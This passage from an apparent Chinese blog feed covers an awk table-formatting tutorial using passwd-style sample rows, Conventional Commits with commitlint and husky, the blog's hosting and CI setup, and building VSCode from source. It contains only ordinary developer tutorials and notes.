&quot;R2&quot;, &quot;R3&quot;, &quot;R4&quot;, &quot;R5&quot;, &quot;R6&quot;, &quot;R7&quot;)\</span></span><br><span class="line"><span class="string">&#125; &#123;\</span></span><br><span class="line"><span class="string">  print(NR, $1, $2, $3, $4, $5, $6, $7)\</span></span><br><span class="line"><span class="string">&#125; &#x27;</span></span><br></pre></td></tr></table></figure><p>在原来的基础上，我们增加了 <code>BEGIN &#123; &#125;</code> 段落，为此我们就给内容提供了表头：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">No. R1 R2 R3 R4 R5 R6 R7</span><br><span class="line">1 root x 0 0 root /root /bin/bash</span><br><span class="line">2 daemon x 1 1 daemon /usr/sbin /usr/sbin/nologin</span><br><span class="line">3 bin x 2 2 bin /bin /usr/sbin/nologin</span><br><span class="line">4 sys x 3 3 sys /dev /usr/sbin/nologin</span><br><span class="line">5 sync x 4 65534 sync /bin /bin/sync</span><br><span class="line">6 games x 5 60 games /usr/games /usr/sbin/nologin</span><br><span class="line">7 man x 6 12 man /var/cache/man /usr/sbin/nologin</span><br><span class="line">8 lp x 7 7 lp /var/spool/lpd /usr/sbin/nologin</span><br><span class="line">9 mail x 8 8 mail /var/mail /usr/sbin/nologin</span><br><span class="line">10 news x 9 9 news /var/spool/news /usr/sbin/nologin</span><br></pre></td></tr></table></figure><p><code>NR</code> 是行号的意思，为了让它好看一点，我们使用 <code>printf</code> 函数进行格式化打印：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; BEGIN &#123;\</span></span><br><span class="line"><span class="string">  printf(&quot;%8s %5s %5s %5s %5s %5s %15s %20s\n&quot;, &quot;No.&quot;, &quot;R1&quot;, &quot;R2&quot;, &quot;R3&quot;, &quot;R4&quot;, &quot;R5&quot;, &quot;R6&quot;, &quot;R7&quot;)\</span></span><br><span class="line"><span class="string">&#125; &#123;\</span></span><br><span class="line"><span class="string">  printf(&quot;%5s %8s %5s %5s %5s %5s %15s %20s\n&quot;, NR, $1, $2, $3, $4, $5, $6, $7)\</span></span><br><span class="line"><span class="string">&#125; &#x27;</span></span><br></pre></td></tr></table></figure><p>打印的结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">  No.    R1    R2    R3    R4    R5              R6                   R7</span><br><span class="line"> 1     root     x     0     0  root           /root            /bin/bash</span><br><span class="line"> 2   daemon     x     1     1 daemon       /usr/sbin    /usr/sbin/nologin</span><br><span class="line"> 3      bin     x     2     2   bin            /bin    /usr/sbin/nologin</span><br><span class="line"> 4      sys     x     3     3   sys            /dev    /usr/sbin/nologin</span><br><span class="line"> 5     sync     x     4 65534  sync            /bin            /bin/sync</span><br><span class="line"> 6    games     x     5    60 games      /usr/games    /usr/sbin/nologin</span><br><span class="line"> 7      man     x     6    12   man  /var/cache/man    /usr/sbin/nologin</span><br><span class="line"> 8       lp     x     7     7    lp  /var/spool/lpd    /usr/sbin/nologin</span><br><span class="line"> 9     mail     x     8     8  mail       /var/mail    /usr/sbin/nologin</span><br><span class="line">10     news     x     9     9  news /var/spool/news    /usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>怎么样，这个表单看起来就很自然了吧！</p><h3 id="表单筛选"><a href="#表单筛选" class="headerlink" title="表单筛选"></a>表单筛选</h3><p>想象一下，拿到手里的是一个 Excel 表格，我们要对表格进行分析，比如，我要隐藏 R2、R3、R4 这几栏，十分简单，打印的时候不写出来就行了，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; BEGIN &#123;\</span></span><br><span class="line"><span class="string">  printf(&quot;%8s %5s %5s %15s %20s\n&quot;, &quot;No.&quot;, &quot;R1&quot;, &quot;R5&quot;, &quot;R6&quot;, &quot;R7&quot;)\</span></span><br><span class="line"><span class="string">&#125; &#123;\</span></span><br><span class="line"><span class="string">  printf(&quot;%5s %5s %5s %15s %20s\n&quot;, NR, $1, $5, $6, $7)\</span></span><br><span class="line"><span class="string">&#125; &#x27;</span></span><br></pre></td></tr></table></figure><p>结果是：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">  No.    R1    R5              R6                   R7</span><br><span class="line"> 1  root  root           /root            /bin/bash</span><br><span class="line"> 2 daemon daemon       /usr/sbin    /usr/sbin/nologin</span><br><span class="line"> 3   bin   bin            /bin    /usr/sbin/nologin</span><br><span class="line"> 4   sys   sys            /dev    /usr/sbin/nologin</span><br><span class="line"> 5  sync  sync            /bin            /bin/sync</span><br><span class="line"> 6 games games      /usr/games    /usr/sbin/nologin</span><br><span class="line"> 7   man   man  /var/cache/man    /usr/sbin/nologin</span><br><span class="line"> 8    lp    lp  /var/spool/lpd    /usr/sbin/nologin</span><br><span class="line"> 9  mail  mail       /var/mail    /usr/sbin/nologin</span><br><span class="line">10  news  news /var/spool/news    /usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>再比如，我们想拿到第六列包含 var 的内容，正则过滤下就行了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; $6 ~ /var/ &#123;\</span></span><br><span class="line"><span class="string">  printf(&quot;%5s %5s %5s %15s %20s\n&quot;, NR, $1, $5, $6, $7)\</span></span><br><span class="line"><span class="string">&#125; &#x27;</span></span><br></pre></td></tr></table></figure><p>执行结果是：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> 7   man   man  /var/cache/man    /usr/sbin/nologin</span><br><span class="line"> 8    lp    lp  /var/spool/lpd    /usr/sbin/nologin</span><br><span class="line"> 9  mail  mail       /var/mail    /usr/sbin/nologin</span><br><span class="line">10  news  news /var/spool/news    /usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>再来个复杂点的，我们想拿到 R4 范围在 0~5，并且不包含 Root 的数据：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; $4 &gt;= 0 &amp;&amp; $4 &lt;= 5 &amp;&amp;\</span></span><br><span class="line"><span class="string">  $1 !~ /root/ &#123;\</span></span><br><span class="line"><span class="string">    printf(&quot;%5s %5s %5s %15s %20s\n&quot;, NR, $1, $5, $6, $7)\</span></span><br><span class="line"><span class="string">  &#125; &#x27;</span></span><br></pre></td></tr></table></figure><p>筛选结果出来了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2 daemon daemon       /usr/sbin    /usr/sbin/nologin</span><br><span class="line">3   bin   bin            /bin    /usr/sbin/nologin</span><br><span class="line">4   sys   sys            /dev    /usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>相关的筛选功能还有很多，这里就不一一枚举了，上述几个筛选其实也已经可以满足大部分的条件了。</p><h3 id="增加表尾"><a href="#增加表尾" class="headerlink" title="增加表尾"></a>增加表尾</h3><p>我们想统计 R7 包含 <code>nologin</code> 信息的条目数量，展示在表尾，稍微复杂一点，这里会用到一点编程知识：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; BEGIN &#123;\</span></span><br><span class="line"><span class="string">  count = 0\</span></span><br><span class="line"><span class="string">&#125; &#123;\</span></span><br><span class="line"><span class="string">  if ($7 ~ /nologin/)&#123; count = count + 1; &#125;\</span></span><br><span class="line"><span class="string">  printf(&quot;%5s %8s %5s %5s %5s %5s %15s %20s\n&quot;, NR, $1, $2, $3, $4, $5, $6, $7)\</span></span><br><span class="line"><span class="string">&#125; END &#123;\</span></span><br><span class="line"><span class="string">  printf(&quot;total %s items with nologin&quot;, count)\</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>看到的结果是：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">    1     root     x     0     0  root           /root            /bin/bash</span><br><span class="line">    2   daemon     x     1     1 daemon       /usr/sbin    /usr/sbin/nologin</span><br><span class="line">    3      bin     x     2     2   bin            /bin    /usr/sbin/nologin</span><br><span class="line">    4      sys     x     3     3   sys            /dev    /usr/sbin/nologin</span><br><span class="line">    5     sync     x     4 65534  sync            /bin            /bin/sync</span><br><span class="line">    6    games     x     5    60 games      /usr/games    /usr/sbin/nologin</span><br><span class="line">    7      man     x     6    12   man  /var/cache/man    /usr/sbin/nologin</span><br><span class="line">    8       lp     x     7     7    lp  /var/spool/lpd    /usr/sbin/nologin</span><br><span class="line">    9     mail     x     8     8  mail       /var/mail    /usr/sbin/nologin</span><br><span class="line">   10     news     x     9     9  news /var/spool/news    /usr/sbin/nologin</span><br><span class="line">total 8 items with nologin</span><br></pre></td></tr></table></figure><p>结尾多了一行，我们来分析下这句命令，总共分为三段：</p><ul><li><code>BEGIN &#123; count = 0 &#125;</code>，声明计数器</li><li><code>&#123; if ($7 ~ /nologin/)&#123; count = count + 1; &#125; printf(...) &#125;</code>，判断并计数</li><li><code>END &#123; printf(&quot;total %s items with nologin&quot;, count)&#125;</code>，打印结果</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>以上，揭开了 awk 的面纱以后，你会发现它并没有那么复杂。当然，awk 也远不是上面我们看到的这么简单，它的使用可以变得非常复杂只不过在日常的运维过程中我们用不上而已。</p><p>把 awk 当做表单处理工具来理解，我相信你一定可以轻松记住它的所有命令，就算记不住，以后看到一长串命令也能够很快地理解它。更多资料可以看这个手册：<a href="http://www.gnu.org/software/gawk/manual/gawk.html">The GNU Awk User’s Guide</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 运维技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 约定式提交规范实践</title>
      <link href="/blog/2019/10/28/commit-convention/"/>
      <url>/blog/2019/10/28/commit-convention/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.conventionalcommits.org/en/v1.0.0/">约定式提交规范</a> 提供了一个轻量级的提交历史编写规则，它的内容十分简单：</p><figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">type</span>&gt;[<span class="keyword">optional</span> scope]: &lt;description&gt;</span><br><span class="line"></span><br><span class="line">[<span class="keyword">optional</span> body]</span><br><span class="line"></span><br><span class="line">[<span class="keyword">optional</span> footer(s)]</span><br></pre></td></tr></table></figure><p>举个简单的例子：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">feat(<span class="built_in">config</span>): 允许 <span class="built_in">config</span> 对象直接从其他 <span class="built_in">config</span> 继承</span><br><span class="line"></span><br><span class="line"><span class="keyword">BREAKING </span>CHANGE: 在 <span class="built_in">config</span> 对象中增加 `<span class="keyword">extends` </span>字段，用于从其他继承 <span class="built_in">config</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">close </span>issue <span class="comment">#23</span></span><br></pre></td></tr></table></figure><p>在 git commit 时，如果你想进行多行 commit 编辑，可以通过 <code>git commit -a</code> 进入编辑界面；如果是单行，可以直接 <code>git commit -a -m &#39;COMMIT MESSAGE&#39;</code> 完成提交。</p><h3 id="更多的约定"><a href="#更多的约定" class="headerlink" title="更多的约定"></a>更多的约定</h3><p>约定式规范与 <a href="http://semver.org/">SemVer</a> 的设计是相吻合的，</p><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="type">PATCH</span> -&gt; <span class="keyword">type</span>(fix)</span><br><span class="line"><span class="type">MINOR</span> -&gt; <span class="keyword">type</span>(feat)</span><br><span class="line"><span class="type">MAJOR</span> -&gt; <span class="type">BREAKING</span> <span class="type">CHNAGE</span></span><br></pre></td></tr></table></figure><p>大部分的提交中，我们都会使用 fix 和 feat 来描述本次修改的类型，当然也包含其他类型，如 <code>chore/docs/reflector/improvement/perf/test/style</code>，值得注意的是：</p><ul><li>一般不用写 <code>body</code> 部分的内容，除非存在 <code>BREAKING CHANGE</code></li><li><code>description</code> 的内容要相当简明扼要，用简单的语句把修改点直接说出来</li><li>一般不建议将多次修改放在一次提交中，尤其是一次半（第二个修改只完成了一部分）的情况</li><li><code>scope</code> 可以是一个文件的地址，如 <code>/lib/utils</code>；也可以是某个功能点 <code>parser</code>，不建议超过两个单词</li></ul><h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><p><strong>合并多次提交</strong></p><p>如果你上次修改的内容存在 bug 或未完成，本次提交的内容与上次几乎一样，建议使用 <code>git rebase -i</code> 进行提交的合并，如</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> rebase -i HEAD~<span class="number">3</span> # 展示最近 <span class="number">3</span> 次修改</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">pick <span class="number">0291959</span> <span class="built_in">chore</span>(blog): 清理无关项</span><br><span class="line">pick <span class="number">1</span>ef8f31 <span class="built_in">chore</span>(blog): 清理无关项</span><br><span class="line">pick <span class="number">36</span>a91db <span class="built_in">fix</span>(post): 格式化 post 的 meta 数据格式,增加 --- 开始符</span><br></pre></td></tr></table></figure><p>可以将第二行的 <code>pick</code> 修改为 <code>squash</code>，表示保留 commit 但将本次修改合并到上次，相关的操作可以看 <a href="https://www.barretlee.com/blog/2018/11/26/git-%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/">这篇文章</a>。</p><p><strong>关闭 ISSUE</strong></p><p>在 github&#x2F;gitlab 中，如果 commit message 中带有 <code>Fix #23</code> 诸如此类的信息，当 commit 被 push 到 repo 后，会自动关闭编号为 23 的 issue。</p><p><strong>自动生成 CHANGELOG</strong></p><p>在写日报或者周报，或者在项目发版时，我们可以很轻松地从提交日志中看到自己或者团队干了些什么事情：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> git-changelog=<span class="string">&#x27;git log --oneline --decorate&#x27;</span>;</span><br></pre></td></tr></table></figure><p>当然也可以使用开源的工程自动生成结构化更强的 CHANGELOG 日志，如 <a href="https://github.com/CookPete/auto-changelog">auto-changelog</a>，它提供了可自定义的 CHANGELOG 模板。</p><h3 id="项目配置"><a href="#项目配置" class="headerlink" title="项目配置"></a>项目配置</h3><p>约定如果没有工具来辅助和约束，大概率就成了一纸空文，毫无意义。在项目实战中，我们可以做如下配置让项目成员强制进行约定式提交。</p><p><strong>1. 安装工具</strong></p><p>推荐使用 <code>@commitlint/cli</code> 进行检测，安装方式：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> install @commitlint/cli --save-dev</span><br></pre></td></tr></table></figure><p><strong>2. 配置约定</strong></p><p>在 <code>@commitlint</code> 工具包中有一个规则比较强的检测规范：<code>@commitlint/config-conventional</code>，也安装到项目中：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> install @commitlint/config-conventional --save-dev</span><br></pre></td></tr></table></figure><p>安装完成后，需要显式地配置，在项目中增加 <code>commitlint.config.js</code>：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; </span><br><span class="line">  <span class="attr">extends</span>: [</span><br><span class="line">    <span class="string">&#x27;@commitlint/config-conventional&#x27;</span></span><br><span class="line">  ] </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>config-conventional</code> 中允许类型有 <code>build/chore/ci/docs/feat/fix/perf/refactor/revert/style/test</code>。</p><p><strong>3. 提交时执行检查</strong></p><p>推荐使用 <code>husky</code> 这个工具，它会帮助我们自动配置 commit hooks，只需在项目中添加 <code>.huskyrc.json</code> 文件：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;hooks&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;pre-commit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node ./node_modules/@commitlint/cli/lib/cli.js -E HUSKY_GIT_PARAMS&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然也可以直接在 package.json 中配置 <code>husky</code> 字段，具体可以查看 <a href="https://github.com/typicode/husky">文档</a>。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>整洁的提交记录并不仅仅意味着开发者自动生成 CHANGELOG，遵守约定可以给项目沉淀一个结构化的提交历史，再加上一些 emoji，生成出来的文档简直就是一篇生动的项目发展史，它有助于我们向公众传达变化的性质，同时对继续集成也会带来一定的好处，比如我们可以根据 type 触发不同的构建和部署流程。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 工具 </category>
          
          <category> 前端杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> commit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本博客的配置和发布</title>
      <link href="/blog/2019/10/27/blog-config/"/>
      <url>/blog/2019/10/27/blog-config/</url>
      
        <content type="html"><![CDATA[<p>分享下我个人博客（<a href="https://www.barretlee.com/">https://www.barretlee.com</a>）的配置和发布：</p><h3 id="1-域名"><a href="#1-域名" class="headerlink" title="1. 域名"></a>1. 域名</h3><p>在 DNSPod 上配置的域名，默认解析到 coding pages，国外解析到 github pages，DNSPod 支持 D 监控，当域名不可用时会邮件警报。</p><p>coding 支持绑定多个域名，也支持给所有绑定的域名自动配置证书，github 只能绑定一个域名，这就会导致 <a href="http://www.barretlee.com/">www.barretlee.com</a> 和 barretlee.com 只能有一个是 https，比较坑，貌似 Google 的 DNS 解析服务能够解决这个问题，国内的似乎都不行。</p><h3 id="2-开发"><a href="#2-开发" class="headerlink" title="2. 开发"></a>2. 开发</h3><p>使用 hexo 构建，由于文章比较多，超过 300 篇，构建时长约 6min，很慢；hexo 支持多 git 仓库部署，我配置了 coding 和 github 两个。</p><p>使用了不少 hexo 的插件，但是很多都不满足需求，不满足需求的插件都重新改写了。平时使用改写的 hexo-admin 在本地编辑内容。</p><p><img src="/../blogimgs/2019/10/27/blog-config-admin.png" alt="blog config admin"></p><h3 id="3-部署"><a href="#3-部署" class="headerlink" title="3. 部署"></a>3. 部署</h3><p>以前每次都是本地编辑文章，然后构建发布，发现错别字，又回到本地编辑、构建、发布，体验十分差，所以近两年都懒得写文章了，宁愿发长微博。</p><p>本周末折腾了一番，接入了 travis-ci，发现还挺好用，只是配置的时候需要注意点 git 仓库权限问题，可以参考 <a href="https://github.com/barretlee/blog/blob/master/.travis.yml">https://github.com/barretlee/blog/blob/master/.travis.yml</a> 解决问题，后续写文章应该会直接走 github 网页新建文件。</p><p><img src="/../blogimgs/2019/10/27/blog-config-travis.png" alt="blog config travis"></p><h3 id="4-评论"><a href="#4-评论" class="headerlink" title="4. 评论"></a>4. 评论</h3><p>从多说到畅言到 github issue，估计不会再继续折腾了，看了两个开源的 github issue 评论组件，gitment 和 gitalk ，这两个工具都有点像半成品，感觉还有很大的优化空间，由于 gitalk UI 稍微看得舒服点，将就着用了，效果如图四。历史评论就懒得迁移了。</p><p><img src="/../blogimgs/2019/10/27/blog-config-comment.png" alt="blog config comment"></p><p>周末把博客 UI 的部分细节做了调整，估计后续三五年都不会再折腾博客设计了。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让 VSCode 在本地 Run 起来</title>
      <link href="/blog/2019/10/23/vscode-study-01-start/"/>
      <url>/blog/2019/10/23/vscode-study-01-start/</url>
      
        <content type="html"><![CDATA[<p>Visual Studio Code 是微软推出的一款轻量级编辑器，与它一起在市场争锋的相似软件还有 Atom 和 Sublime Text，面世第二年的它只占据 7% 左右的市场，后来在短短三年时间雄踞了半壁江山，不可谓不哇塞。</p><p><img src="/../blogimgs/2019/10/23/vscode-snapshot.png" alt="vscode-snapshot"></p><p>发育如此强势的软件，背后到底是如何设计的，未来一段时间，我将带着你一点一点拨开她的面纱，再撩开她的裙摆。</p><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>Visual Studio Code 简称 VSCode，需要注意的是，平时我们使用的 VSCode 那是产品，而下面我们要介绍的是源码，产品是源码的构建结果；源码使用的 <a href="https://github.com/microsoft/vscode/blob/master/LICENSE.txt">MIT License</a>，而产品使用的是这个 <a href="https://code.visualstudio.com/License">MICROSOFT SOFTWARE LICENSE TERMS</a>，如果你想把 VSCode 用于商用，建议从源码构建出新的产品，而不是直接使用人家官网上提供下载链接的 VSCode Product。</p><ul><li>官网地址是 <a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></li><li>源码在这里：<a href="https://github.com/microsoft/vscode">https://github.com/microsoft/vscode</a>。</li></ul><p>我们先把源码 down 下来：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone --depth <span class="number">1</span> https:<span class="regexp">//gi</span>thub.com<span class="regexp">/microsoft/</span>vscode.git</span><br></pre></td></tr></table></figure><p>由于 VSCode 项目过于活跃，提交量非常庞大，到目前为止，已经有 <code>56,092</code> 次提交了，建议在下载源码的时候加了一句 <code>--depth 1</code>，意思就是只现在最近一次 commit 的代码。</p><p>30s 后……71M，不慢。</p><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p>在安装依赖之前，我们不妨稍微分析下 VSCode 的项目结构，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  vscode (master) tree -L 1</span><br><span class="line">.</span><br><span class="line">├── CONTRIBUTING.md</span><br><span class="line">├── LICENSE.txt</span><br><span class="line">├── README.md</span><br><span class="line">├── ThirdPartyNotices.txt</span><br><span class="line">├── azure-pipelines.yml</span><br><span class="line">├── build/</span><br><span class="line">├── cglicenses.json</span><br><span class="line">├── cgmanifest.json</span><br><span class="line">├── extensions/</span><br><span class="line">├── gulpfile.js</span><br><span class="line">├── package.json</span><br><span class="line">├── product.json</span><br><span class="line">├── remote/</span><br><span class="line">├── resources/</span><br><span class="line">├── scripts/</span><br><span class="line">├── src/</span><br><span class="line">├── <span class="built_in">test</span>/</span><br><span class="line">├── tsfmt.json</span><br><span class="line">├── tslint.json</span><br><span class="line">└── yarn.lock</span><br></pre></td></tr></table></figure><p>未来我们需要重点关注的是 <code>src/</code> 和 <code>extensions/</code> 两个目录，前者放的是 VSCode 的核心源码，后者放的是 VSCode 的内置插件。</p><p>眼神再晃动一下，应该还会看到几个熟悉的关键词，<code>build/</code>,<code>gulpfile.js</code>,<code>package.json</code>,<code>tslint.json</code> 和 <code>yarn.lock</code>，由此，我们基本可以断定，这个仓库是一个用 TypeScript 开发，用 yarn 管理依赖，用 gulp 进行打包的 Node.js 项目，事实上她也是一个 <a href="https://electronjs.org/">Electron</a> 项目。</p><p>好了，目录就看到这里，接着开始安装漫长的依赖安装：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  vscode (master) yarn</span><br></pre></td></tr></table></figure><p>执行 yarn 后，VSCode 会干三件事情：</p><ul><li>preinstall 脚本中对 yarn 的版本做判断<ul><li>要求必须 &gt;&#x3D;1.10.1</li><li>并且只允许使用 yarn 来安装依赖，npm 安装会弹个错误</li></ul></li><li>安装 package.json 中描述的各个依赖<ul><li>很多依赖都需要重新编译，而编译过程经常会失败</li><li>失败了怎么办？看错误提示，如果流程没中断，就让它一直跑下去</li><li>一直卡着，好像不跑了怎么办？<code>ctrl-c</code> 终止进程后重新执行 <code>yarn</code></li></ul></li><li>postinstall 挨个安装 build&#x2F;remote&#x2F;test&#x2F;extensions 等目录中的依赖<ul><li>extension 的安装比较特殊，安装的过程中又会执行 <code>updateGrammar</code> 脚本</li></ul></li></ul><p>整个安装过程十分的慢，可以考虑泡杯咖啡打开电视剧……   </p><p>执行了 yarn 整个安装并没有结束，剩下几步 VSCode 会在你执行 gulp 相关脚本的时候做检测，倘若资源不存在便会安装，由于很多资源都在墙外，我们还是分解下动作，分步手动下载：</p><p><strong>1. 把 Electron 安装下来：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  vscode (master) yarn electron</span><br></pre></td></tr></table></figure><p>如果下载太慢，建议在命令行开下代理：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  vscode (master) proxychains4 yarn electron</span><br></pre></td></tr></table></figure><p>这里附加一个小插曲，</p><blockquote><p>安装到半途时更换了下代理，应该是 gulp-vinyl-zip 这个包处理 buffer 异常，导致下次下载断点续传 buffer 位置对不上，然后每次执行 yarn electron 就直接退出进程，应该是个 bug；解决办法是，在这个包的 <code>open()</code> 方法里打个 log，把 path 打印出来，然后把打印出来的资源删掉就行了。</p></blockquote><p>一小时后……</p><p>我已经不能忍了，电视剧都看了一集了，还是没下载完，其实 <code>electron-v6.0.12-darwin-x64</code> 这个文件只有 66.2M。</p><p>为了完成 electron 的安装，不得不附加第二个插曲，</p><blockquote><p>还是得翻源码解决问题：之前可以通过全局配置 ELECTRON_MIRROR 的地址来选择 Electron 下载源，而最新版 VSCode 的 Electron 是直接从 github 上下载的，从 gulp-atom-electron 这个包的源码里断点找到了 asset 和 assetPath，手动将 asset 下载下来后放到 assetPath，解决了问题。</p></blockquote><p><strong>2. 把内置的几个依赖插件安装下来：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  vscode (master) yarn download-builtin-extensions</span><br></pre></td></tr></table></figure><p>历时差不多一个小时，终于把依赖下载完成了，这是我安装依赖花的时间最长的一次，家里的网络还是比不上厂里自带翻墙功能的网络，衰……</p><h3 id="构建程序"><a href="#构建程序" class="headerlink" title="构建程序"></a>构建程序</h3><p>由于启动一次构建花费的时间太长，1~5min 不等（看机器性能和人品），所以我建议你使用 <code>yarn watch</code> 来构建，它会完成一次构建并监听文件的变化，后续不用重新构建。</p><p>构建完成以后，就可以执行命令打开 VSCode 的界面了，不过在打开之前，我意外地在 package.json 的 scripts 中发现，VSCode 竟然已经有 Web 版本了！！！</p><p><img src="/../blogimgs/2019/10/23/vscode-web.png" alt="VSCode Web"></p><p>这比我之前的预期要早了很多，很早就听说他们内部团队在搞 Web 版本了，没想到这么快就要面世了。社区上有一个基于 VSCode 搞的 Web 版，叫 <a href="https://github.com/cdr/code-server">Code-Server</a>，Star 量有好几万，估计官方的 Web 版出来以后，code-server 就要凉凉了。</p><p>哦，把 web 版本跑起来的方式是：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gulp watch 完成后执行</span></span><br><span class="line">➜  vscode (master) yarn web</span><br></pre></td></tr></table></figure><p>会自动弹开一个地址：<a href="http://localhost:8080/">http://localhost:8080/</a>，目前 Web 版的功能还不完备，比如插件部分就没有适配，应该还在研发状态，连 inside 版本都没进。这也算是我写这个教程的第一个意外惊喜吧，看来我得重新研究下 VSCode 的源码了。</p><p>执行如下脚本，可以打开 VSCode 的客户端：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  vscode (master) ./scripts/code.sh</span><br></pre></td></tr></table></figure><p>然后你就可以看到这样的界面了：</p><p><img src="/../blogimgs/2019/10/23/vscode-client.png" alt="VSCode Client"></p><p>如果你是 windows 系统，执行的脚本应该是 <code>./script/code.bat</code>。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>好了，本文的扫盲就到这里。</p><p>本文主要通过傻瓜式地教学，给大家演示了下，如何将源码变成我们熟悉的 VSCode 客户端，相信同学们在动手的过程中还会遇到各种依赖安装问题，不要灰心，实在不行就 <code>rm -rf node_modules</code>，然后重试。</p><p>下回再给大家讲述 <a href="https://www.barretlee.com/blog/2019/11/01/vscode-study-02-debugging/">如何开发和调试 VSCode 的源码</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂谈 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag>  VSCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode 是怎么运行起来的？</title>
      <link href="/blog/2019/08/03/vscode-source-code-reading-notes/"/>
      <url>/blog/2019/08/03/vscode-source-code-reading-notes/</url>
      
